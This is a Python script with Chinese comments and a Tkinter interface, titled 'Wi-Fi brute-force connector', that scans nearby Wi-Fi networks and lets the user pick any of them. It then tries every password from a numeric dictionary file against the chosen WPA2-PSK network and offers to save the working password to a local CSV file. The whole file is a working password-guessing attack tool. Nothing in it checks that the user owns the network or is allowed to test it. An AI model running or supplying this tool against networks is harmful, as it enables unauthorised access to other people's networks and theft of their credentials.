import pywifi
from pywifi import const
import tkinter as tk
from tkinter import messagebox, simpledialog
import time
import os
import csv


def scan_networks():
    """扫描所有可用的Wi-Fi网络，去重并按信号强度排序，并尝试修复乱码SSID。"""
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    time.sleep(4)  # 等待扫描完成

    results = iface.scan_results()

    unique_networks = {}
    for network in results:
        # 尝试解码SSID，解决乱码问题
        try:
            # 优先尝试utf-8解码，因为这是最常见的编码方式
            ssid_name = network.ssid.encode('latin1').decode('utf-8', errors='ignore')
        except UnicodeDecodeError:
            # 如果utf-8解码失败，就直接使用原始的ssid
            ssid_name = network.ssid

        # 使用处理后的ssid名称作为key进行去重
        network.ssid = ssid_name

        if network.ssid not in unique_networks or network.signal > unique_networks[network.ssid].signal:
            unique_networks[network.ssid] = network

    unique_results = list(unique_networks.values())
    unique_results.sort(key=lambda x: x.signal, reverse=True)
    return unique_results


def save_credentials(ssid, password):
    """
    将SSID和密码保存到与脚本同目录的credentials.csv文件中。
    如果文件不存在，将创建它并添加表头。
    """
    # 获取当前脚本的目录
    script_dir = os.path.dirname(os.path.abspath(__file__))
    file_path = os.path.join(script_dir, 'credentials.csv')

    # 检查文件是否已存在
    file_exists = os.path.isfile(file_path)

    with open(file_path, 'a', newline='', encoding='utf-8') as csvfile:
        fieldnames = ['SSID', 'Password']
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)

        # 如果文件不存在，则写入表头
        if not file_exists:
            writer.writeheader()

        writer.writerow({'SSID': ssid, 'Password': password})


def connect_with_dictionary(ssid, password_list):
    """
    尝试使用密码字典中的密码连接到指定的Wi-Fi网络，并在成功后提示保存密码。
    """
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    for password in password_list:
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password

        iface.remove_all_network_profiles()
        temp_profile = iface.add_network_profile(profile)

        print(f"尝试连接到 {ssid}，使用密码: {password}")
        iface.connect(temp_profile)

        time.sleep(5)

        if iface.status() == const.IFACE_CONNECTED:
            # 连接成功
            messagebox.showinfo("连接成功", f"成功连接到Wi-Fi: {ssid}")

            # 弹窗询问是否保存密码
            if messagebox.askyesno("保存密码", f"是否将密码 '{password}' 保存到本地？"):
                save_credentials(ssid, password)
                messagebox.showinfo("保存成功", "凭据已保存！")

            return True

    # 如果所有密码都尝试失败
    messagebox.showerror("连接失败", f"无法连接到Wi-Fi: {ssid}，密码字典中没有找到正确的密码。")
    return False


def load_passwords_from_file(file_path):
    """从指定文件中读取密码并返回列表。"""
    passwords = []
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                password = line.strip()
                if password:
                    passwords.append(password)
        return passwords
    except FileNotFoundError:
        messagebox.showerror("文件未找到", f"错误：找不到文件 '{file_path}'。请检查路径是否正确。")
        return None
    except Exception as e:
        messagebox.showerror("读取错误", f"读取文件时发生错误: {e}")
        return None


def show_networks():
    """在GUI窗口中显示Wi-Fi网络列表。"""
    root = tk.Tk()
    root.title("Wi-Fi 暴力连接器")

    # 定义密码文件的完整路径，请替换为你的实际路径
    password_file_path = "D:\\mI5\\python program\\wifi_crack\\numeric_passwords.txt"
    password_dictionary = load_passwords_from_file(password_file_path)

    if not password_dictionary:
        root.destroy()
        return

    networks = scan_networks()

    if not networks:
        messagebox.showinfo("无网络", "没有扫描到任何Wi-Fi网络。")
        root.destroy()
        return

    def on_select(event):
        """处理列表框中的选择事件。"""
        selection = network_listbox.curselection()
        if not selection:
            return

        index = selection[0]
        selected_network_ssid = networks[index].ssid

        connect_with_dictionary(selected_network_ssid, password_dictionary)

    label = tk.Label(root, text=f"已加载 {len(password_dictionary)} 个密码。请选择一个网络进行连接：")
    label.pack(pady=10)

    network_listbox = tk.Listbox(root, width=50, height=15)
    network_listbox.pack(padx=10, pady=10)

    for network in networks:
        network_listbox.insert(tk.END, f"SSID: {network.ssid}, 信号强度: {network.signal} dBm")

    network_listbox.bind('<<ListboxSelect>>', on_select)

    root.mainloop()


if __name__ == "__main__":
    show_networks()